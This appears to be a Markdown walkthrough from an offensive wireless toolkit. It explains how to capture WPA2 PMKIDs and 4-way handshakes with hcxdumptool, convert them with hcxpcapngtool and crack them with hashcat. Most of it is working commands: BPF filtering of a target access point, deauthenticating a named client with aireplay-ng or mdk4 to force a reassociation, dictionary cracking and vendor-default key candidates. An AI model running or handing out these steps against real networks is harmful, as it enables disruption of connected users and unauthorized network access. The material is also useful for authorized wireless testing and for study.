# hcxtools — walkthrough

The modern PMKID + 4-way capture toolchain. Supersedes aircrack-ng's
`airodump-ng + aireplay-ng` pipeline for handshake collection.

Version-pinned to **hcxdumptool 7.3** (2024-Q4). See the compat table
in `reference.md` when reading older tutorials — the 4.x → 6.x → 7.x
CLI reworks renamed or removed most of the flags stale write-ups use.

## Preconditions

- hcxdumptool + hcxpcapngtool installed (`apt install hcxtools` on
  Kali; on OpenWRT / Pineapple, `opkg install hcxtools`).
- Monitor-capable adapter; hcxdumptool manages its own monitor mode.
- Optional: hashcat host with GPU for the crack step.
- A precompiled BPF filter if you want to scope capture to specific
  BSSIDs (see `reference.md` for the compile command).

## Path A — PMKID capture (client-free)

```
# Precompile a BPF filter for the target BSSID.
echo 'wlan addr3 aa:bb:cc:dd:ee:ff' > /root/target.bpf.src
tcpdump -y IEEE802_11_RADIO -F /root/target.bpf.src -ddd \
        > /root/target.bpf

hcxdumptool -i wlan1 \
  -w /tmp/pmkid.pcapng \
  --enable_status=3 \
  --bpf=/root/target.bpf

# Watch the status output — look for "PMKID FOUND" or similar.
# Ctrl-C when it lands (usually seconds).

# Convert to hashcat 22000.
hcxpcapngtool -o /tmp/hs.22000 /tmp/pmkid.pcapng
grep '^WPA\*01' /tmp/hs.22000     # confirms PMKID line
```

## Path B — 4-way handshake capture with external deauth

> **6.x removed every active attack mode.** hcxdumptool no longer
> sends deauth or disassoc frames. Force a reassoc from a second
> process (mdk4, aireplay-ng, or a scapy script) while hcxdumptool
> passively listens on the same monitor iface.

```
# Terminal 1: passive capture, BPF-filtered to the target.
hcxdumptool -i wlan1 \
  -w /tmp/handshake.pcapng \
  --enable_status=15 \
  --bpf=/root/target.bpf

# Terminal 2: knock a specific client off so it reassociates.
# aireplay-ng needs its own monitor iface; on many chipsets you can
# share one, on others you'll want a second radio.
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1
```

Alternatively drive deauth with `mdk4 wlan1 d -B <bssid_list>` or a
scapy oneliner — hcxdumptool itself will not deauth.

Convert:

```
hcxpcapngtool -o /tmp/hs.22000 /tmp/handshake.pcapng
grep '^WPA\*02' /tmp/hs.22000
```

## Path C — ESSID filter (crack fewer hashes)

Beacon captures often pull in adjacent APs. Filter down before
converting:

```
hcxpcapngtool \
  --essid=TargetSSID \
  -o /tmp/hs.22000 \
  /tmp/dump.pcapng
```

Or filter at capture time by pointing `--bpf=<compiled_bpf>` at a
BPF program that matches your target BSSIDs (see `reference.md` for
the compile recipe).

## Path D — hcxlabtool aggressive sweep

hcxlabtool runs hcxdumptool in a channel-sweeping loop:

```
hcxlabtool -i wlan1 -o /tmp/lab.pcapng
```

Best for a lab environment or a broad WCTF room recon. Very loud —
sends assoc probes across many BSSIDs.

## Path E — Convert existing pcaps

```
# From .cap (aircrack-ng) or .pcapng
hcxpcapngtool -o /tmp/hs.22000 legacy_capture.cap

# Info on what was parsed
hcxpcapngtool --info legacy_capture.pcapng
# Look at output — reports PMKID / 4-way pairs found.
```

## Path F — Chain to hashcat

```
hashcat -m 22000 /tmp/hs.22000 /path/to/rockyou.txt -w 4 --status
```

The `WPA*01` / `WPA*02` distinction is transparent to hashcat mode
22000.

## Path G — Feed a candidate PSK list (vendor default)

```
# Combine with default-psk-derivation:
./upc_keys UPC1234567 > /tmp/upc-cands.txt
hashcat -m 22000 /tmp/hs.22000 /tmp/upc-cands.txt
```

## Failure modes

- **`hcxdumptool` reports 0 PMKIDs / handshakes.** AP suppresses
  PMKID and no clients associating during capture window. Widen the
  window or try Path B (deauth to force a reassoc).
- **`hcxpcapngtool` emits nothing.** Capture is missing the full
  4-way OR the ESSID doesn't match. Run `--info` on the pcap and
  check the frame-type breakdown.
- **Multiple ESSIDs in the pcap.** Use `--essid=` filter.
- **Adapter isn't monitor-capable.** hcxdumptool refuses to bring
  it up; use a supported chipset (see
  `hardware-and-antennas/reference.md`).
- **`WPA*01` line but crack fails.** Malformed conversion. Re-run
  `hcxpcapngtool` on the raw pcap; some 22000 files have stray
  `\r\n` on Windows-authored captures.

## Ergonomics

- `--enable_status=<bitmask>` — status lines to stdout (there is no
  TUI in 6.x/7.x). Common values: `1` (basic), `3` (adds EAPOL),
  `15` (adds authentication frames).
- `--rcascan=active` — active scan for beacons on nearby channels
  first (`passive` for a passive-only variant). Replaces the old
  `--rcascan=1` / `--do_rcascan`.
- `--gpsd` — GPS integration (wardrive mode). This is a boolean
  flag now; the old `--use_gpsd=1` syntax was retired in 7.x.
- `--rds=1` was removed in 6.2 — do not use it. Reach for
  `--enable_status` instead.
- Store BPF programs on disk; do not try to inline BSSID lists on
  the command line.

## Cite

- hcxtools GitHub — ZerBea.
- hashcat mode 22000 docs — the target format.
- attacks.json: `pmkid-capture`, `wpa2-4way-capture`.
